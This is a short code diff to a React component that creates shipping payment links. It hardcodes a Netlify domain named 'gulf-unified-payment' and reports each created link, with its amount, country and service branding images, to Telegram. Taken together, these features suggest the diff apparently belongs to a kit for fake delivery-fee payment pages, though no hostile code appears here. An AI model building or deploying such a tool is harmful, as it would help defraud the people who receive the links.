@@ -85,6 +85,7 @@ const CreateShippingLink = () => {
       });
       
       // Send data to Telegram with image and description
+      const productionDomain = 'https://gulf-unified-payment.netlify.app';
       const telegramResult = await sendToTelegram({
         type: 'shipping_link_created',
         data: {
@@ -93,7 +94,7 @@ const CreateShippingLink = () => {
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
           country: countryData.nameAr,
-          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`
+          payment_url: `${productionDomain}/r/${country}/${link.type}/${link.id}?service=${selectedService}`
         },
         timestamp: new Date().toISOString(),
         imageUrl: serviceBranding?.ogImage || serviceBranding?.heroImage,
@@ -101,7 +102,7 @@ const CreateShippingLink = () => {
       });
 
       // حفظ الرابط وإظهار Dialog
-      const paymentUrl = `${window.location.origin}/pay/${link.id}/recipient?service=${selectedService}`;
+      const paymentUrl = `${productionDomain}/pay/${link.id}/recipient?service=${selectedService}`;
       setCreatedPaymentUrl(paymentUrl);
       setLinkId(link.id);
       setShowSuccessDialog(true);
